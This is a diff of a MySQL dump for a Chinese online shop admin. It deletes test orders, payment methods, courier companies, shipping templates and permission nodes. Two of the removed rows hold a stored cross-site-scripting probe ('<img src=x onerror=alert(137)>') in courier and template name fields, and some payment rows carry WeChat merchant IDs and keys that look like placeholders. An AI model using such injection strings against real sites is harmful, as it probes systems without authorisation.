-INSERT INTO `shop_order_send` VALUES (10, 4, 'N20210120735241195', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-20 22:52:31', '', 1, '邮费模板编码无效！', 0.00, 'YTO', '圆通速递', 'YT9327072216017', '454', '2021-01-21 13:17:55', 2, 0, '2021-01-20 22:51:55');
-INSERT INTO `shop_order_send` VALUES (11, 4, 'N20210120781054024', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-20 22:56:12', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:56:12');
-INSERT INTO `shop_order_send` VALUES (12, 46, 'N20210120300798917', 'A2021012030444', '测试wei', '13800138000', '', '北京市', '北京市', '东城区', '哈哈', '2021-01-20 23:07:45', '', 2, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 23:07:45');
-INSERT INTO `shop_order_send` VALUES (13, 49, 'N20210120442768544', 'A2021012044595', '某', '18812345678', '', '河北省', '石家庄市', '长安区', '哦哦哦哦哦', '2021-01-20 23:22:00', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 23:22:00');
-INSERT INTO `shop_order_send` VALUES (14, 49, 'N20210120452852256', 'A2021012044595', '某', '18812345678', '', '河北省', '石家庄市', '长安区', '哦哦哦哦哦', '2021-01-20 23:22:31', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 23:22:31');
-INSERT INTO `shop_order_send` VALUES (15, 4, 'N20210120764439654', 'A2021012023588', '小小邹2', '17620103800', '', '内蒙古自治区', '赤峰市', '阿鲁科尔沁旗', '测试地址', '2021-01-20 23:54:06', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 23:53:47');
-INSERT INTO `shop_order_send` VALUES (16, 4, 'N20210121604294597', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-21 01:59:45', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-21 01:59:45');
-INSERT INTO `shop_order_send` VALUES (17, 4, 'N20210121440505534', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-21 10:34:08', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-21 10:34:08');
-INSERT INTO `shop_order_send` VALUES (18, 4, 'N20210121500671160', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-21 10:40:09', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-21 10:40:09');
-INSERT INTO `shop_order_send` VALUES (19, 4, 'N20210121510604334', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-21 11:40:09', 'T2021010850419', 1, '首件计费，不超过1件', 1.00, '', '', '', '', '', 1, 0, '2021-01-21 11:40:09');
-INSERT INTO `shop_order_send` VALUES (20, 4, 'N20210121202025467', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-21 12:08:23', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-21 12:08:23');
-INSERT INTO `shop_order_send` VALUES (21, 4, 'N20210121423457020', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-21 14:28:37', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-21 14:28:37');
-INSERT INTO `shop_order_send` VALUES (22, 49, 'N20210123144868747', 'A2021012044595', '某', '18812345678', '', '河北省', '石家庄市', '长安区', '哦哦哦哦哦', '2021-01-23 06:08:52', 'T2021010850419', 1, '首件计费，不超过1件', 1.00, '', '', '', '', '', 1, 0, '2021-01-23 06:08:52');
-INSERT INTO `shop_order_send` VALUES (23, 4, 'N20210125564272086', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-25 18:38:45', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-25 18:38:45');
-INSERT INTO `shop_order_send` VALUES (24, 4, 'N20210125672667842', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-25 18:50:54', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-25 18:50:54');
-INSERT INTO `shop_order_send` VALUES (25, 3, 'N20210224174060040', 'A2021022442364', 'xxx', '13617343800', '', '山西省', '长治市', '屯留县', 'ssdafsdfa', '2021-02-24 16:01:43', 'T2021022055462', 1, '首件计费，不超过1件', 1.00, '', '', '', '', '', 1, 0, '2021-02-24 16:01:43');
-INSERT INTO `shop_order_send` VALUES (26, 3, 'N20210224175990054', 'A2021022442364', 'xxx', '13617343800', '', '山西省', '长治市', '屯留县', 'ssdafsdfa', '2021-02-24 16:02:01', 'T2021022055462', 1, '首件计费，不超过1件', 1.00, '', '', '', '', '', 1, 0, '2021-02-24 16:02:01');
 
 -- ----------------------------
 -- Table structure for shop_payment
@@ -1083,19 +709,11 @@ CREATE TABLE `shop_payment`  (
   INDEX `idx_data_payment_code`(`code`) USING BTREE,
   INDEX `idx_data_payment_status`(`status`) USING BTREE,
   INDEX `idx_data_payment_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-支付-方式' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-支付-方式' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_payment
 -- ----------------------------
-INSERT INTO `shop_payment` VALUES (1, 'balance', 'M7111525366859', '帐户余额支付', '{\"name\":\"帐户余额支付\",\"type\":\"balance\",\"wechat_appid\":\"\",\"wechat_mch_id\":\"\",\"wechat_mch_key\":\"\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"code\":\"M7111525366859\"}', '', 0, 1, 1, '2021-01-20 22:22:28');
-INSERT INTO `shop_payment` VALUES (2, 'wechat_gzh', 'M7111525608571', '微信商户支付', '{\"name\":\"微信商户支付\",\"type\":\"wechat_gzh\",\"wechat_appid\":\"wx60a43dd8161666d4\",\"wechat_mch_id\":\"34653263464\",\"wechat_mch_key\":\"46346272fdgdsgdsfgsddfgasdfgd122\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"id\":\"2\",\"code\":\"M7111525608571\"}', '', 0, 1, 1, '2021-01-20 22:23:03');
-INSERT INTO `shop_payment` VALUES (3, 'wechat_gzh', 'M7111525608571', '微信商户支付', '{\"name\":\"微信商户支付\",\"type\":\"wechat_gzh\",\"wechat_appid\":\"wx9999999999999999\",\"wechat_mch_id\":\"34653263464\",\"wechat_mch_key\":\"46346272fdgdsgdsfgsddfgasdfgdsfg\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"code\":\"M7111525608571\"}', '', 0, 1, 1, '2021-01-20 22:23:03');
-INSERT INTO `shop_payment` VALUES (4, 'balance', 'M7118224403965', '312313', '{\"name\":\"312313\",\"type\":\"balance\",\"wechat_appid\":\"\",\"wechat_mch_id\":\"\",\"wechat_mch_key\":\"\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"code\":\"M7118224403965\"}', '', 0, 1, 1, '2021-01-28 16:27:25');
-INSERT INTO `shop_payment` VALUES (5, 'balance', 'M7118225886428', '3123123123123', '{\"name\":\"3123123123123\",\"type\":\"balance\",\"wechat_appid\":\"\",\"wechat_mch_id\":\"\",\"wechat_mch_key\":\"\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"id\":\"5\",\"code\":\"M7118225886428\"}', '', 0, 1, 1, '2021-01-28 16:29:51');
-INSERT INTO `shop_payment` VALUES (6, 'balance', 'M7121736687157', '微信代付通道', '{\"name\":\"微信代付通道\",\"type\":\"balance\",\"wechat_appid\":\"\",\"wechat_mch_id\":\"\",\"wechat_mch_key\":\"\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"id\":\"6\",\"code\":\"M7121736687157\"}', '', 0, 1, 0, '2021-02-01 18:01:14');
-INSERT INTO `shop_payment` VALUES (7, 'balance', 'M7126245708994', '通用', '{\"name\":\"通用\",\"type\":\"balance\",\"wechat_appid\":\"\",\"wechat_mch_id\":\"\",\"wechat_mch_key\":\"\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"id\":\"7\",\"code\":\"M7126245708994\"}', '', 0, 1, 0, '2021-02-06 23:16:14');
-INSERT INTO `shop_payment` VALUES (8, 'balance', 'M7136557065766', '余额支付', '{\"name\":\"余额支付\",\"type\":\"balance\",\"wechat_appid\":\"\",\"wechat_mch_id\":\"\",\"wechat_mch_key\":\"\",\"wechat_mch_key_text\":\"\",\"wechat_mch_cert_text\":\"\",\"alipay_appid\":\"\",\"alipay_private_key\":\"\",\"alipay_public_key\":\"\",\"joinpay_appid\":\"\",\"joinpay_trade\":\"\",\"joinpay_mch_id\":\"\",\"joinpay_mch_key\":\"\",\"remark\":\"\",\"id\":\"8\",\"code\":\"M7136557065766\"}', '', 0, 1, 0, '2021-02-18 21:42:13');
 
 -- ----------------------------
 -- Table structure for shop_payment_item
@@ -1119,20 +737,11 @@ CREATE TABLE `shop_payment_item`  (
   INDEX `idx_data_payment_item_payment_type`(`payment_type`) USING BTREE,
   INDEX `idx_data_payment_item_payment_trade`(`payment_trade`) USING BTREE,
   INDEX `idx_data_payment_item_payment_status`(`payment_status`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-支付-记录' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-支付-记录' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_payment_item
 -- ----------------------------
-INSERT INTO `shop_payment_item` VALUES (1, 'N20210120433297929', '商城订单支付', 98.80, 0, 'balance', '', 0, NULL, NULL, '2021-01-20 22:24:12');
-INSERT INTO `shop_payment_item` VALUES (2, 'N20210120561627506', '商城订单支付', 701.16, 0, 'balance', '', 0, NULL, NULL, '2021-01-20 22:35:17');
-INSERT INTO `shop_payment_item` VALUES (3, 'N20210120735241195', '商城订单支付', 98.80, 0, 'balance', '20210120754231652751', 1, 98.80, '2021-01-20 22:53:42', '2021-01-20 22:52:10');
-INSERT INTO `shop_payment_item` VALUES (4, 'N20210120735241195', '商城订单支付', 98.80, 0, 'balance', '20210120754231652751', 1, 98.80, '2021-01-20 22:53:42', '2021-01-20 22:53:42');
-INSERT INTO `shop_payment_item` VALUES (5, 'N20210120781054024', '商城订单支付', 98.94, 0, 'balance', '', 0, NULL, NULL, '2021-01-20 23:01:32');
-INSERT INTO `shop_payment_item` VALUES (6, 'N20210120300798917', '商城订单支付', 197.92, 0, 'balance', '', 0, NULL, NULL, '2021-01-20 23:08:02');
-INSERT INTO `shop_payment_item` VALUES (7, 'N20210120442768544', '商城订单支付', 98.60, 0, 'balance', '', 0, NULL, NULL, '2021-01-20 23:22:11');
-INSERT INTO `shop_payment_item` VALUES (8, 'N20210121604294597', '商城订单支付', 98.26, 0, 'balance', '', 0, NULL, NULL, '2021-01-21 01:59:53');
-INSERT INTO `shop_payment_item` VALUES (9, 'N20210123144868747', '商城订单支付', 66.79, 0, 'balance', '', 0, NULL, NULL, '2021-01-23 06:08:57');
 
 -- ----------------------------
 -- Table structure for shop_truck_company
@@ -1155,31 +764,25 @@ CREATE TABLE `shop_truck_company`  (
   INDEX `idx_shop_truck_company_code3`(`code_3`) USING BTREE,
   INDEX `idx_shop_truck_company_status`(`status`) USING BTREE,
   INDEX `idx_shop_truck_company_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 21 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '商城-快递-公司' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 15 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '商城-快递-公司' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_truck_company
 -- ----------------------------
-INSERT INTO `shop_truck_company` VALUES (1, '顺丰速运', 'SF', 'shunfeng', 'shunfeng', '', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (2, '百世快递', 'HTKY', 'huitongkuaidi', 'huitongkuaidi', '', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (3, '中通快递', 'ZTO', 'zhongtong', 'zhongtong', '', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (4, '申通快递', 'STO', 'shentong', 'shentong', '', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (5, '圆通速递', 'YTO', 'yuantong', 'yuantong', '', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (6, '韵达速递', 'YD', 'yunda', 'yunda', '', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (7, '邮政快递包裹', 'YZPY', 'youzhengguonei', 'youzhengguonei', '123456', 0, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (8, 'EMS\"><img src=x onerror=alert(137) ~2F>', 'EMS\"><img src=x onerror=alert(137) ~2F>', '\"><img src=x onerror=alert(137) ~2F>', 'ems\"><img src=x onerror=alert(137) ~2F>', '\"><img src=x onerror=alert(137) ~2F>', 0, 0, 1, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (9, '天天快递', 'HHTT', 'tiantian', 'tiantian', '', 22, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (10, '京东快递', 'JD', 'jd', 'jd', '', 110, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (11, '优速快递', 'UC', 'youshuwuliu', 'youshuwuliu', '', 12, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (12, '德邦快递', 'DBL', 'debangwuliu', 'debangkuaidi', '', 411, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (13, '宅急送', 'ZJS', 'zhaijisong', 'zhaijisong', '', 12, 1, 0, '2020-04-09 16:23:41');
-INSERT INTO `shop_truck_company` VALUES (14, '韵达快递', 'YDA', 'yunda', 'yunda', '', 0, 0, 1, '2020-04-14 10:51:56');
-INSERT INTO `shop_truck_company` VALUES (15, '极兔快递', 'jtexpress', 'jtexpress', 'jtexpress', '', 0, 1, 0, '2020-09-15 08:44:08');
-INSERT INTO `shop_truck_company` VALUES (16, '213', '123', '', '', '', 0, 1, 0, '2020-11-07 22:45:10');
-INSERT INTO `shop_truck_company` VALUES (17, '顺丰速运', 'SF', 'shunfeng', 'shunfeng', '', 0, 1, 0, '2020-12-10 10:33:35');
-INSERT INTO `shop_truck_company` VALUES (18, '5', '5', '5', '5', '5', 0, 0, 1, '2021-01-09 10:14:17');
-INSERT INTO `shop_truck_company` VALUES (19, 'rrff', 'fff', 'ffff', '', '', 0, 1, 0, '2021-01-19 22:54:26');
-INSERT INTO `shop_truck_company` VALUES (20, 'EMS', 'EMS', 'ems', 'ems', '', 0, 1, 0, '2021-01-21 10:58:02');
+INSERT INTO `shop_truck_company` VALUES (1, '顺丰速运', 'SF', 'shunfeng', 'shunfeng', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (2, '百世快递', 'HTKY', 'huitongkuaidi', 'huitongkuaidi', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (3, '中通快递', 'ZTO', 'zhongtong', 'zhongtong', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (4, '申通快递', 'STO', 'shentong', 'shentong', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (5, '圆通速递', 'YTO', 'yuantong', 'yuantong', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (6, '韵达速递', 'YD', 'yunda', 'yunda', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (7, '邮政快递包裹', 'YZPY', 'youzhengguonei', 'youzhengguonei', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (8, 'EMS', 'EMS', 'ems', 'ems', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (9, '天天快递', 'HHTT', 'tiantian', 'tiantian', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (10, '京东快递', 'JD', 'jd', 'jd', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (11, '德邦快递', 'DBL', 'debangwuliu', 'debangkuaidi', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (12, '优速快递', 'UC', 'youshuwuliu', 'youshuwuliu', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (13, '宅急送', 'ZJS', 'zhaijisong', 'zhaijisong', '', 0, 1, 0, '2020-12-22 07:23:05');
+INSERT INTO `shop_truck_company` VALUES (14, '极兔快递', 'jtexpress', 'jtexpress', 'jtexpress', '', 0, 1, 0, '2020-12-22 07:23:05');
 
 -- ----------------------------
 -- Table structure for shop_truck_region
@@ -1200,7 +803,7 @@ CREATE TABLE `shop_truck_region`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_shop_truck_region_pid`(`pid`) USING BTREE,
   INDEX `idx_shop_truck_region_name`(`name`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 4019 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '商城-快递-区域' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 4019 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '商城-快递-区域' ROW_FORMAT = Compact;
 
 -- ----------------------------
 -- Records of shop_truck_region
@@ -4965,18 +4568,11 @@ CREATE TABLE `shop_truck_template`  (
   `deleted` tinyint(1) UNSIGNED NULL DEFAULT 0 COMMENT '删除状态',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-快递-模板' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-快递-模板' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_truck_template
 -- ----------------------------
-INSERT INTO `shop_truck_template` VALUES (1, 'T2021010850419', '123', '{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}', '[]', 0, 0, 0, '2021-01-08 15:35:48');
-INSERT INTO `shop_truck_template` VALUES (2, 'T2021011847399', 'dthyt', '{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}', '[]', 0, 1, 0, '2021-01-18 11:36:48');
-INSERT INTO `shop_truck_template` VALUES (3, 'T2021011976356', 'ffff', '{\"firstNumber\":\"NaN\",\"firstAmount\":\"NaN\",\"repeatNumber\":\"NaN\",\"repeatAmount\":\"NaN\"}', '[]', 0, 1, 0, '2021-01-19 22:54:52');
-INSERT INTO `shop_truck_template` VALUES (4, 'T2021012111397', '\"><img src=x onerror=alert(137) ~2F>', '{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}', '[]', 0, 1, 1, '2021-01-21 01:10:46');
-INSERT INTO `shop_truck_template` VALUES (5, 'T2021020312161', 'Boom Guo', '{\"firstNumber\":\"NaN\",\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}', '[{\"city\":[{\"name\":\"北京市\",\"subs\":[\"北京市\"]}],\"rule\":{\"firstNumber\":\"1\",\"firstAmount\":\"2.00\",\"repeatNumber\":\"1\",\"repeatAmount\":\"1.00\"}}]', 0, 0, 0, '2021-02-03 10:03:33');
-INSERT INTO `shop_truck_template` VALUES (6, 'T2021020471541', 'asdasdasd', '{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}', '[{\"city\":[{\"name\":\"江苏省\",\"subs\":[\"南京市\",\"无锡市\",\"徐州市\",\"常州市\",\"苏州市\",\"南通市\",\"连云港市\",\"淮安市\",\"盐城市\",\"扬州市\",\"镇江市\",\"泰州市\",\"宿迁市\"]},{\"name\":\"湖南省\",\"subs\":[\"长沙市\",\"株洲市\",\"湘潭市\",\"衡阳市\",\"邵阳市\",\"岳阳市\",\"常德市\",\"张家界市\",\"益阳市\",\"郴州市\",\"永州市\",\"怀化市\",\"娄底市\",\"湘西土家族苗族自治州\"]},{\"name\":\"四川省\",\"subs\":[\"内江市\",\"乐山市\",\"眉山市\",\"雅安市\",\"达州市\",\"广安市\",\"宜宾市\",\"南充市\"]}],\"rule\":{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}}]', 0, 1, 0, '2021-02-04 16:56:19');
-INSERT INTO `shop_truck_template` VALUES (7, 'T2021022055462', 'abababab', '{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}', '[{\"city\":[{\"name\":\"江苏省\",\"subs\":[\"南京市\",\"无锡市\",\"徐州市\",\"常州市\",\"苏州市\",\"南通市\",\"连云港市\",\"淮安市\",\"盐城市\",\"扬州市\",\"镇江市\",\"泰州市\",\"宿迁市\"]}],\"rule\":{\"firstNumber\":1,\"firstAmount\":\"1.00\",\"repeatNumber\":1,\"repeatAmount\":\"1.00\"}}]', 0, 1, 0, '2021-02-20 14:42:37');
 
 -- ----------------------------
 -- Table structure for system_auth
@@ -4990,16 +4586,14 @@ CREATE TABLE `system_auth`  (
   `status` tinyint(1) UNSIGNED NULL DEFAULT 1 COMMENT '权限状态(1使用,0禁用)',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
-  INDEX `idx_system_auth_status`(`status`) USING BTREE,
-  INDEX `idx_system_auth_title`(`title`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 14 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-权限' ROW_FORMAT = Compact;
+  INDEX `idx_system_auth_title`(`title`) USING BTREE,
+  INDEX `idx_system_auth_status`(`status`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-权限' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_auth
 -- ----------------------------
-INSERT INTO `system_auth` VALUES (10, '555', '555', 0, 1, '2021-02-05 12:48:54');
-INSERT INTO `system_auth` VALUES (11, '小编', '小编', 0, 0, '2021-02-09 10:04:54');
-INSERT INTO `system_auth` VALUES (13, '测试权限', '测试', 0, 1, '2021-02-20 11:20:47');
+INSERT INTO `system_auth` VALUES (1, 'test', '', 0, 1, '2021-02-24 09:24:55');
 
 -- ----------------------------
 -- Table structure for system_auth_node
@@ -5012,138 +4606,11 @@ CREATE TABLE `system_auth_node`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_system_auth_auth`(`auth`) USING BTREE,
   INDEX `idx_system_auth_node`(`node`(191)) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 1471 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-授权' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-授权' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_auth_node
 -- ----------------------------
-INSERT INTO `system_auth_node` VALUES (1344, 3, 'data');
-INSERT INTO `system_auth_node` VALUES (1345, 3, 'data/config');
-INSERT INTO `system_auth_node` VALUES (1346, 3, 'data/config/wxapp');
-INSERT INTO `system_auth_node` VALUES (1347, 3, 'data/config/about');
-INSERT INTO `system_auth_node` VALUES (1348, 3, 'data/config/slider');
-INSERT INTO `system_auth_node` VALUES (1349, 3, 'data/config/agreement');
-INSERT INTO `system_auth_node` VALUES (1350, 3, 'data/news_item');
-INSERT INTO `system_auth_node` VALUES (1351, 3, 'data/news_item/index');
-INSERT INTO `system_auth_node` VALUES (1352, 3, 'data/news_item/add');
-INSERT INTO `system_auth_node` VALUES (1353, 2, 'data');
-INSERT INTO `system_auth_node` VALUES (1354, 2, 'data/config');
-INSERT INTO `system_auth_node` VALUES (1355, 2, 'data/config/wxapp');
-INSERT INTO `system_auth_node` VALUES (1356, 2, 'data/config/about');
-INSERT INTO `system_auth_node` VALUES (1357, 2, 'data/config/slider');
-INSERT INTO `system_auth_node` VALUES (1358, 2, 'data/config/agreement');
-INSERT INTO `system_auth_node` VALUES (1359, 2, 'data/news_item');
-INSERT INTO `system_auth_node` VALUES (1360, 2, 'data/news_item/index');
-INSERT INTO `system_auth_node` VALUES (1361, 2, 'data/news_item/add');
-INSERT INTO `system_auth_node` VALUES (1362, 2, 'data/news_item/edit');
-INSERT INTO `system_auth_node` VALUES (1363, 2, 'data/news_item/state');
-INSERT INTO `system_auth_node` VALUES (1364, 2, 'data/news_item/remove');
-INSERT INTO `system_auth_node` VALUES (1365, 2, 'data/news_mark');
-INSERT INTO `system_auth_node` VALUES (1366, 2, 'data/news_mark/index');
-INSERT INTO `system_auth_node` VALUES (1367, 2, 'data/news_mark/add');
-INSERT INTO `system_auth_node` VALUES (1368, 2, 'data/news_mark/edit');
-INSERT INTO `system_auth_node` VALUES (1369, 2, 'data/news_mark/state');
-INSERT INTO `system_auth_node` VALUES (1370, 2, 'data/news_mark/remove');
-INSERT INTO `system_auth_node` VALUES (1371, 2, 'data/shop_goods');
-INSERT INTO `system_auth_node` VALUES (1372, 2, 'data/shop_goods/index');
-INSERT INTO `system_auth_node` VALUES (1373, 2, 'data/shop_goods/add');
-INSERT INTO `system_auth_node` VALUES (1374, 2, 'data/shop_goods/edit');
-INSERT INTO `system_auth_node` VALUES (1375, 2, 'data/shop_goods/copy');
-INSERT INTO `system_auth_node` VALUES (1376, 2, 'data/shop_goods/stock');
-INSERT INTO `system_auth_node` VALUES (1377, 2, 'data/shop_goods/state');
-INSERT INTO `system_auth_node` VALUES (1378, 2, 'data/shop_goods/remove');
-INSERT INTO `system_auth_node` VALUES (1379, 2, 'data/shop_goods_cate');
-INSERT INTO `system_auth_node` VALUES (1380, 2, 'data/shop_goods_cate/index');
-INSERT INTO `system_auth_node` VALUES (1381, 2, 'data/shop_goods_cate/add');
-INSERT INTO `system_auth_node` VALUES (1382, 2, 'data/shop_goods_cate/edit');
-INSERT INTO `system_auth_node` VALUES (1383, 2, 'data/shop_goods_cate/state');
